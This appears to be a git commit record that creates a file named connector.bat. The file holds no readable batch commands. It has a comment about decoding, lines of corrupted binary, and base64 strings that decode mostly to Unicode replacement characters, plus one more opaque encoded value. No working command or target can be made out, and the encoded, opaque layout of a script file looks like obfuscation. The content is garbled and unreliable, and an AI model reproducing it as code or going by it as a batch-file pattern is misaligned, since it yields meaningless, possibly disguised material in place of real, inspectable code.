dec3edff058008ab413ee32b1dc0b27397cbd582
TLLH <104279021+TLLH-org@users.noreply.github.com>
2022-07-10 16:23:27 +0300

    Create connector.bat

---
+++ connector.bat
@@ -0,0 +1,11 @@
+#decode batch system64
+y�h����^r��y�\�x���p��Z��(���y�hº'��b�*b~*a�'i�x5�mz�]^r0���{�
+ee+/vWjvv73vv73vv73vv71ecu+/ve+/vXnvv71c77+9eO+/ve+/ve+/vXDvv73vv71a77+977+9KO+/ve+/ve+/vXnvv71owron77+977+9Yu+/vSpifiph77+9J2nvv714Ne+/vW1677+9XV5yGjDvv73vv73vv717GO+/vQ==
+~)^�+-zfڵ�a�'fi�!jxvf��Wfi��
+�!jxvf��Wfi���+��-
+file77+9Ky16Ztq177+9Ye+/vSdmae+/vSFqeB52Zu+/ve+/vVdmae+/vR7vv70K77+9ByFqeB52Zu+/ve+/vVdmae+/vR7vv73vv70r77+977+9LQ==
+
+
+
+#basic enc
+sTxFT7RWaE3/2aaMdZmeRjW47nugtaOvylI+T/uDZbQ=
